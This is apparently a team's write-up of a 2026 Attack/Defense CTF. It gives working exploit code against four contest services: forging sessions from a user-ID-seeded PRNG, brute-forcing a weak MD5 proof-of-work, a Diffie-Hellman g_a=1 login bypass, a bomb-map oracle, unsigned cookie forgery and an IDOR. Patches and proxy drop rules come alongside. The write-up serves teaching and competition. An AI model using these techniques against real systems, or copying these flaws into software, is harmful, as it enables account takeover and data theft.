---
layout: post
title: "CyberChallenge.IT A/D CTF 2026 — Kosovo Team 4: How We Held First Place"
date: 2026-05-09
tags: [ad-ctf, web, pwn, crypto, reverse]
---

**Team:** Kosovo Team 4 (Team ID 84) | **Result:** First place for the majority of the competition

CyberChallenge.IT runs an annual Attack/Defense CTF where university teams from across Europe compete. The 2026 edition featured roughly 84 teams. Kosovo Team 4 — one of only a handful of non-Italian teams — held the top position for a significant stretch of the day, repeatedly outpacing well-resourced Italian university teams.

This is a technical account of how we got there: the services we reversed, the vulnerabilities we found, the exploits we wrote, and the farm loop that kept flags flowing every 120-second tick.

---

## Competition Structure

- **Tick length:** 120 seconds
- **Flag validity:** 5 ticks (10 minutes)
- **Flag format:** `[A-Z0-9]{31}=`
- **Flag IDs API:** `http://10.10.0.1:8081/flagIds` — per-team, per-tick identifiers (user IDs, board names, cheat IDs, order IDs)
- **Submission:** HTTP PUT to `http://10.10.0.1:8080/flags` with `X-Team-Token`, rate-limited to 30 req/min

Four services were in scope:

| Service | Port | Language |
|---|---|---|
| SeaOfHackerz | 5050 (HTTP via nginx) | Python / Flask + PostgreSQL |
| CheesyCheats | 5000 (Manager gRPC/TLS), 5555 (API gRPC/TLS) | Python gRPC |
| MineCClicker | 9999 (custom binary TCP) | C (compiled ELF) |
| GadgetHorse | 3000 (HTTP) | Node.js / SvelteKit |

We exploited all four.

---

## Preparation

Before the start gun we pulled service source code from our own VM at `10.60.84.1` into `~/Desktop/ad2copies/`. We also brought up Tulip (traffic analyzer) and Yampa (MITM proxy). The Python exploit environment: Python 3.13, pwntools 4.15, pycryptodome, grpcio.

Per-service workflow:
1. Read source code (or reverse binary for MineCClicker)
2. Identify vulnerability
3. Write exploit, test against our own VM
4. Integrate into `farm_all.py`
5. Run `farm_all.py` in a loop timed to the 120-second tick

---

## Service 1 — SeaOfHackerz (port 5050)

A pirate-themed web RPG backed by Flask and PostgreSQL. The CTF checker places the current tick's flag inside a `personal_description` field in the `inventory` table, attached to a `user_id` published via the flag IDs API.

### Vulnerability: Predictable Session Token

Session cookies are base64-encoded JSON. The backend generates them in `validate_session()`:

```python
def validate_session(session):
    decoded = base64.b64decode(session)
    session_data = json.loads(decoded)
    random.seed(session_data["user_id"])           # seeded with user_id
    salt = bytes([random.getrandbits(8) for _ in range(16)])
    salted_hash = hashlib.sha256(
        salt + str(session_data["user_id"]).encode()).hexdigest()
    if not salted_hash == session_data["salted_hash"]:
        raise InvalidSessionException()
    return session_data
```

Python's `random` module is a deterministic Mersenne Twister. Seeding it with a known integer (`user_id`) means **anyone who knows `user_id` can reproduce the exact salt, recompute the hash, and craft a valid session cookie with zero interaction with the server.**

A second unauthenticated endpoint makes this trivially weaponisable:

```
GET /api/user/<user_id>  →  {"status":"ok","user":"<username>"}
```

No authentication required. Given any `user_id`, we fetch the username for free, then mint a valid session.

### Exploit

```python
def forge_session(user_id, username):
    random.seed(user_id)
    salt = bytes([random.getrandbits(8) for _ in range(16)])
    salted_hash = hashlib.sha256(salt + str(user_id).encode()).hexdigest()
    cookie = base64.b64encode(json.dumps({
        "username":    username,
        "user_id":     user_id,
        "salted_hash": salted_hash,
    }).encode()).decode()
    return cookie

def exploit_user(target_ip, uid):
    r = requests.get(f"http://{target_ip}:5050/api/user/{uid}")
    uname = r.json().get("user")
    session = forge_session(uid, uname)
    r2 = requests.get(
        f"http://{target_ip}:5050/api/user/items",
        cookies={"session": session},
    )
    return FLAG_RE.findall(str(r2.json()))
```

The flag IDs API gives us the exact `user_id` per team per tick. Two HTTP requests per flag. With 25 worker threads attacking 80 teams in parallel, the entire sweep finishes well inside a single tick.

### Patch

Replace `random.seed(user_id)` with `secrets.token_hex(16)` stored in the database alongside the session. Also add `@auth_required` to `GET /api/user/<user_id>`.

### Yampa Defense Rule

```
DROP("soh-session-forge") TAGS("session-forgery") : IN(5050) :
    "\"salted_hash\"";
```

Drops any inbound request to port 5050 containing the `salted_hash` JSON key in the cookie — something only an attacker building the cookie from scratch would include.

---

## Service 2 — CheesyCheats (ports 5000 / 5555)

A gRPC service for buying and selling game cheats, protected by TLS. The Manager service (port 5000) handles registration, a two-step Diffie-Hellman login, cheat listing, and purchase. The API service (port 5555) handles Redeem — returning the cheat body where the flag lives.

The checker injects flags in two independent ways:
- **CC-1:** The flag is stored as the *body* of a `cheat_id` published via flag IDs. A Proof-of-Work gates `BuyCheat`.
- **CC-2:** The flag is held by a *specific user* (username published via flag IDs). Their account must be compromised.

### Vulnerability A — MD5 PoW Brute-Force (CC-1)

```python
def verify_pow(prefix, target, value):
    h = md5(value).hexdigest()
    return value.startswith(prefix) and h.startswith(target)
```

A 4-character hex `target` covers 16 bits — roughly 1/65536 random values pass. With modern hardware doing tens of millions of MD5s per second, finding a preimage takes milliseconds.

```python
def brute_pow(prefix, target_s, max_att=500000):
    prefix_b = prefix.encode() if isinstance(prefix, str) else prefix
    chars = (string.ascii_letters + string.digits).encode()
    for _ in range(max_att):
        suffix = bytes(random.choices(chars, k=random.randint(4, 8)))
        cand = prefix_b + suffix
        if hashlib.md5(cand).hexdigest().startswith(target_s):
            return cand.decode(errors='replace')
    return None
```

Attack flow: Register → Login → `GetCheatInfo(cheat_id)` → get (prefix, target) → brute_pow → `BuyCheat(cheat_id, preimage)` → `Redeem(cheat_id)` → flag.

### Vulnerability B — Diffie-Hellman K=1 Auth Bypass (CC-2)

The Manager's `LoginStep1`:

```python
def LoginStep1(self, request, _):
    user_password = self.db['user.' + request.username].encode()
    h = sha256(user_password).hexdigest()
    g = pow(int(h, 16), 2, utils.p)
    b = random.randint((utils.p-1)//2, utils.p-1)
    g_b = pow(g, b, utils.p)
    K = pow(int(request.g_a, 16), b, utils.p)   # uses our g_a
    loginkeys = self.db['loginkeys.' + request.username]
    loginkeys.append(hex(K)[2:])
    ...
    return cc_pb2.LoginStep1Reply(status=True, g_b=hex(g_b)[2:])
```

The server computes `K = g_a^b mod p` and stores it as a valid authentication token. If we send `g_a = 1`, then `K = 1^b mod p = 1` for any `b`. The server stores `"1"` in `loginkeys`. We call `LoginStep2` with `K="1"` and the server accepts it — issuing a valid session for the victim's account with **zero knowledge of their password**.

```python
def k1_login(mgr_stub, victim_username, timeout=8):
    r1 = mgr_stub.LoginStep1(
        cheesycheats_pb2.LoginStep1Request(username=victim_username, g_a='1'),
        timeout=timeout,
    )
    r2 = mgr_stub.LoginStep2(
        cheesycheats_pb2.LoginStep2Request(username=victim_username, K='1'),
        timeout=timeout,
    )
    return r2.session if r2.status else None
```

**Root cause:** The protocol fails to bind the session key K to the password verifier. A proper SRP implementation computes `K = H(g_a^b)` where `g_a = g^a` and the client proves knowledge of the password through a mutual hash challenge. Here `K` is just `g_a^b mod p` with no such binding.

### Patches

- CC-1: Increase PoW difficulty — require 6 hex characters (48 bits) instead of 4 (16 bits), making brute-force ~65000x harder.
- CC-2: Reject `g_a` values of `'0'` or `'1'` in `LoginStep1`. More robustly, add a challenge-response step that verifies `H(K || username || password_hash)`.

### Yampa Defense Rules

```
DROP("cc-k1-bypass")  TAGS("grpc-auth") : IN(5000) : "\x00\x00\x00\x00\x011";
DROP("cc-pow-brute")  TAGS("grpc-pow")  : IN(5000) : "BuyCheat";
```

---

## Service 3 — MineCClicker (port 9999)

A Minesweeper-style game implemented as a compiled C binary over a custom binary TCP protocol. Players sign up, log in, create/load boards, play a game (receive seed, dimensions, bomb count), uncover cells, and call `CHECK_WIN` with a correctly-flagged bomb map to receive the board's secret — the flag.

### Protocol

All frames: `timestamp(u32 LE) | type(u8) | payload_len(u16 LE)`. Strings: `len(u8) | bytes`. PLAY response: `game_seed(u64 LE) | board_dim(u64 LE) | num_bombs(u64 LE)`. CHECK_WIN payload: `dim(u64 LE) | packed_bits` (1 bit per cell, row-major, 1=bomb).

| Type | ID |
|---|---|
| SIGNUP | 0 |
| LOGIN | 1 |
| CREATE_BOARD | 2 |
| LOAD_BOARD | 3 |
| PLAY | 4 |
| UNCOVER | 5 |
| CHECK_WIN | 6 |
| QUIT | 7 |

### Vulnerability: Bomb Hit Reveals the Full Board

When `UNCOVER` hits a bomb, the server sends back the **complete bomb map** as a packed bitfield: `dim(u64 LE) | ((dim*dim+7)//8 bytes of packed bits)`. This is a game-UX feature (show where all bombs were when you lose) turned into an oracle.

If we hit one bomb, we immediately receive the exact map we need to submit to `CHECK_WIN`. The server accepts our win claim and returns the flag. No need to know the board seed or reproduce the RNG.

**Probability analysis:** For a board of dimension `d` with `b` bombs, the probability of missing all bombs across `n` cells is `((d*d-b)/(d*d))^n`. We want success probability >99%:

```
n = ceil(log(0.01) / log(1 - b/(d*d)))
```

For a 10×10 board with 20 bombs: n = 21 cells. We cap at 50.

**Cell selection:** Stride uniformly across the entire board to maximise coverage:

```python
step  = max(1, total // n_needed)
cells = [(i // dim, i % dim) for i in range(0, total, step)][:n_needed]
```

### Exploit — Optimised Final Version

The setup phase batches four requests into a single write to save three round trips:

```python
setup = (
    mkhdr(0, mc_str(uname) + mc_str(pw)) +  # SIGNUP
    mkhdr(1, mc_str(uname) + mc_str(pw)) +  # LOGIN
    mkhdr(3, mc_str(board_name))          +  # LOAD_BOARD
    mkhdr(4)                                 # PLAY
)
sock.sendall(setup)
```

`TCP_NODELAY` is set to disable Nagle buffering. After receiving game metadata, UNCOVER requests are sent one at a time since we need to parse the bomb-hit payload before building CHECK_WIN.

### Patch

On bomb hit, send only `content = -1` with no board data. The checker already knows where the bombs are from its own `CREATE_BOARD` call — it doesn't need the map from the server.

### Yampa Defense Rule

```
DROP("mc-check-win-no-uncover") TAGS("mc-oracle") : IN(9999) :
    "\x06";
```

Type byte `0x06` is `CHECK_WIN`. Attackers send it immediately after receiving a bomb-hit map, without legitimately playing the game.

---

## Service 4 — GadgetHorse (port 3000)

A SvelteKit merchandise shop where users order custom stickers and shirts. Two flag categories:
- **GH-1:** A `productId` is published per tick. The flag is in the SVG returned when viewing that custom product.
- **GH-2:** An `orderId` is published per tick. The flag is in the order's JSON data.

### Vulnerability A — Unsigned Cart Cookie (GH-1)

The `/custom-sticker/<id>` and `/custom-shirt/<id>` endpoints check whether the product ID is present in the `cart` cookie before returning the customised SVG. The cart cookie is plain base64url-encoded JSON — **no signature, no HMAC**.

```python
cart = [{"id": pid, "qty": 1}]
cart_cookie = base64.urlsafe_b64encode(
    json.dumps(cart).encode()
).decode().rstrip("=")

r = requests.get(
    f"http://{target_ip}:3000/custom-sticker/{pid}",
    cookies={"cart": cart_cookie},
)
# Flag is in the SVG <text> element of r.text
```

### Vulnerability B — IDOR in SvelteKit `__data.json` (GH-2)

SvelteKit page server actions expose JSON at `/<route>/__data.json`. The `/order/<orderId>/__data.json` endpoint returns the full order record — including address, name, and surname fields — even when the page logic sets `forbidden=true` for other users' orders. The JSON serialisation path does not enforce the `forbidden` gate. No authentication required:

```python
r = requests.get(
    f"http://{target_ip}:3000/order/{order_id}/__data.json",
)
# FLAG_RE.findall(r.text) extracts flag from address/name/surname
```

Both vulnerabilities are **one HTTP request per flag** — the cheapest exploits of the day.

### Patches

- GH-1: Sign the cart cookie with HMAC-SHA256 using a server-side secret key. Reject any cookie that fails verification.
- GH-2: In `+page.server.js` for the order route, check `forbidden` before serialising `orderInfo` and return a 403 when the order does not belong to the authenticated user.

---

## The Farm Loop

All four exploits were unified in `farm_all.py`. The main loop:

```
Tick N:
  1. Fetch flag_ids from http://10.10.0.1:8081/flagIds
  2. ThreadPoolExecutor(max_workers=25) — one task per team (80 teams)
     Each task: soh_exploit + cc_exploit + mc_exploit + gh_exploit
  3. Collect flags as futures complete, submit to scoreboard in batches of 100
  4. Sleep (100 - elapsed) seconds, then repeat
```

With 25 parallel workers and per-exploit timeouts, the sweep generally completed in 45–70 seconds out of the 120-second tick.

**Key design decisions:**
- **Fresh flag IDs per tick** for MineCClicker and GadgetHorse (board names and order IDs change). SeaOfHackerz and CheesyCheats use IDs that accumulate, so fetching once per sweep is sufficient.
- **Rate-limit awareness** — batch flags in groups of 100 with a 0.3s inter-batch delay (scoreboard cap: 30 req/min).
- **Skip teams 81–83** — non-competing infrastructure teams.
- **Immediate submission at 50+ pending flags** — prevents flags from expiring while waiting for the sweep to finish.

**Tick 1 results:** 650 flags submitted, 234 accepted. 36% acceptance on tick 1 is expected — many were from the current tick (not yet valid) or already sniped by faster teams.

---

## Defense Summary

| Service | Vulnerability | Fix |
|---|---|---|
| SeaOfHackerz | `random.seed(user_id)` session | `secrets.token_hex(16)` stored in DB |
| SeaOfHackerz | Unauthenticated `/api/user/<id>` | `@auth_required` decorator |
| CheesyCheats | K=1 DH bypass | Reject `g_a` in `('0', '1')` in LoginStep1 |
| CheesyCheats | MD5 PoW too easy | Prefix length 4 → 6 hex chars |
| MineCClicker | Bomb hit reveals board | Removed board data from bomb-hit reply |
| GadgetHorse | Unsigned cart cookie | HMAC-SHA256 signing with `SECRET_KEY` |
| GadgetHorse | IDOR `__data.json` | Ownership check before `orderInfo` serialisation |

Every patch was tested against our own checker interaction before deploying. The guiding principle: patch the *input validation* (block the exploit vector) rather than touching core logic, minimising the risk of breaking legitimate checker flows.

---

## Key Takeaways

**Attack:**

1. **Read the source first.** All services provided source. Five minutes of careful reading found more than five hours of fuzzing would have.
2. **Check the cryptography.** Three of four services had broken crypto: predictable PRNG, trivially collapsible DH, unsigned state. Crypto failures are reliable, deterministic, and exploitable with two HTTP requests.
3. **One protocol invariant can be a complete oracle.** MineCClicker's "reveal board on bomb hit" was intended as UX. We turned it into a guaranteed flag extractor with no need to understand the RNG.
4. **Parallelism beats speed.** Fan out 80 concurrent workers — a 40-second-per-team operation becomes a 60-second full sweep.
5. **Use the flag IDs API.** It tells you exactly where each flag is. Enumeration sweeps are a fallback; targeted extraction is always faster.

**Defense:**

6. **Patch the vector, not the symptom.** Blocking port 5050 wholesale kills SLA. Blocking the session-forgery payload pattern stops attackers while the checker continues normally.
7. **One-character change, full stop.** `random.seed(user_id)` → `secrets.token_hex(16)` was a genuinely small diff. Fix early, stay SLA-clean the whole competition.

---

*All exploits were tested first against the NOP team VM at `10.60.0.1` before being turned on against real teams. All flag submission used the authorised team token and complied with competition rules.*
